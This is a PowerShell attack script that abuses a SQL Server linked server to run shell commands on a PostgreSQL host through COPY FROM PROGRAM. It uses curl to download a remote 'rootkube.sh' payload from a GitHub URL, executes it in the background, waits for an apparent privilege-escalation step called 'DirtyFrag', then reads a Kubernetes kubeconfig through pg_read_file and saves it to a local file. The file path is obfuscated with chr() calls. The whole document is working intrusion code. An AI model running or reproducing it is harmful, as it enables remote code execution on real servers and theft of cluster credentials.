$q=[char]39; $dq=[char]36+[char]36
function PG145-Exec($cmd) {
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`TRUNCATE cmd_out$q) AT PG145" 2>&1 | Out-Null
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`COPY cmd_out FROM PROGRAM $dq$cmd$dq$q) AT PG145" 2>&1 | Out-Null
    $r = sqlcmd -S localhost -x -h -1 -W -Q "SELECT * FROM OPENQUERY(PG145,$q`SELECT line FROM cmd_out$q)" 2>&1
    return ($r | Where-Object {$_ -ne "" -and $_ -ne "NULL" -and $_ -notmatch "rows affected|---"})
}
# Download + execute script
$r1 = PG145-Exec "curl -sk -o /tmp/rootkube.sh https://raw.githubusercontent.com/bimhybim-del/ai/main/rootkube.sh && chmod +x /tmp/rootkube.sh && ls -la /tmp/rootkube.sh"
Write-Output "DOWNLOAD: $r1"
# Run async
PG145-Exec "nohup bash /tmp/rootkube.sh > /tmp/rk_out.txt 2>&1 &" | Out-Null
Write-Output "LAUNCHED"
# Wait 55 seconds for DirtyFrag to complete
Write-Output "WAITING 55s..."
Start-Sleep -Seconds 55
# Check if kubeconfig was copied
$r2 = PG145-Exec "ls -la /tmp/kc.txt /tmp/df_log.txt /tmp/rk_out.txt 2>&1"
Write-Output "FILES: $r2"
# Read kubeconfig
$tmpkc = "chr(47)||chr(116)||chr(109)||chr(112)||chr(47)||chr(107)||chr(99)||chr(46)||chr(116)||chr(120)||chr(116)"
$sql = "SELECT * FROM OPENQUERY(PG145,$q`SELECT pg_read_file($tmpkc,0,65536,true) as r$q)"
$r3 = sqlcmd -S localhost -x -h -1 -W -Q $sql 2>&1
$lines = ($r3 | Where-Object {$_ -ne "" -and $_ -ne "NULL" -and $_ -notmatch "rows affected|---"})
if ($lines) {
    Write-Output "KUBECONFIG_FOUND!"
    $outPath = Join-Path "F:\Database" "KUBECONFIG.txt"
    $lines | Out-File $outPath -Encoding ASCII
    Write-Output "SAVED_TO: $outPath"
    $lines | Select-Object -First 3 | ForEach-Object { Write-Output $_ }
} else {
    Write-Output "NO_KUBECONFIG"
    # Check df_log
    $r4 = PG145-Exec "cat /tmp/df_log.txt 2>&1 | head -10"
    Write-Output "DF_LOG: $r4"
    $r5 = PG145-Exec "cat /tmp/rk_out.txt 2>&1 | head -10"
    Write-Output "RK_OUT: $r5"
}
